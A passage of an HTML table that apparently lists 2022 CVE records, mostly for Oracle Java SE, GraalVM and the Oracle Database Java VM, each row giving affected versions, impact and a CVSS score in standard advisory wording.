		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21540">CVE-2022-21540</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 7u343, 8u333, 11.0.15.1, 17.0.3.1, 18.0.1.1; Oracle GraalVM Enterprise Edition: 20.3.6, 21.3.2 and 22.1.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21498">CVE-2022-21498</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 12.1.0.2, 19c and 21c. Easily exploitable vulnerability allows low privileged attacker having Create Procedure privilege with network access via multiple protocols to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java VM accessible data. CVSS 3.1 Base Score 6.5 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21496">CVE-2022-21496</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JNDI). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21476">CVE-2022-21476</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 7.5 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21449">CVE-2022-21449</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 17.0.2 and 18; Oracle GraalVM Enterprise Edition: 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 7.5 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21443">CVE-2022-21443</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21434">CVE-2022-21434</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21426">CVE-2022-21426</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JAXP). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21393">CVE-2022-21393</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 12.1.0.2, 12.2.0.1, 19c and 21c. Easily exploitable vulnerability allows low privileged attacker having Create Procedure privilege with network access via Oracle Net to compromise Java VM. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java VM. CVSS 3.1 Base Score 4.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21366">CVE-2022-21366</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21365">CVE-2022-21365</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21360">CVE-2022-21360</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21349">CVE-2022-21349</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: 2D). Supported versions that are affected are Oracle Java SE: 7u321, 8u311; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21341">CVE-2022-21341</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21340">CVE-2022-21340</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21305">CVE-2022-21305</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21299">CVE-2022-21299</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JAXP). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21296">CVE-2022-21296</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JAXP). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21294">CVE-2022-21294</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21293">CVE-2022-21293</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21291">CVE-2022-21291</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21283">CVE-2022-21283</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21282">CVE-2022-21282</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JAXP). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21277">CVE-2022-21277</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21271">CVE-2022-21271</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21248">CVE-2022-21248</a></td>
		<td valign="top">Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-21230">CVE-2022-21230</a></td>
		<td valign="top">This affects all versions of package org.nanohttpd:nanohttpd. Whenever an HTTP Session is parsing the body of an HTTP request, the body of the request is written to a RandomAccessFile when the it is larger than 1024 bytes. This file is created with insecure permissions that allow its contents to be viewed by all users on the host machine. **Workaround:** Manually specifying the -Djava.io.tmpdir= argument when launching Java to set the temporary directory to a directory exclusively controlled by the current user can fix this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-20763">CVE-2022-20763</a></td>
		<td valign="top">A vulnerability in the login authorization components of Cisco Webex Meetings could allow an authenticated, remote attacker to inject arbitrary Java code. This vulnerability is due to improper deserialization of Java code within login requests. An attacker could exploit this vulnerability by sending malicious login requests to the Cisco Webex Meetings service. A successful exploit could allow the attacker to inject arbitrary Java code and take arbitrary actions within the Cisco Webex Meetings application.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-20419">CVE-2022-20419</a></td>
		<td valign="top">In setOptions of ActivityRecord.java, there is a possible load any arbitrary Java code into launcher process due to a logic error in the code. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-12L Android-13Android ID: A-237290578

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2022-1452">CVE-2022-1452</a></td>
		<td valign="top">Out-of-bounds Read in r_bin_java_bootstrap_methods_attr_new function in GitHub repository radareorg/radare2 prior to 5.7.0. The bug causes the program reads data past the end 2f the intented buffer. Typically, this can allow attackers to read sensitive information from other memory locations or cause a crash. More details see [CWE-125: Out-of-bounds read](https://cwe.mitre.org/data/definitions/125.html).

</td>
	</tr>
	<tr>
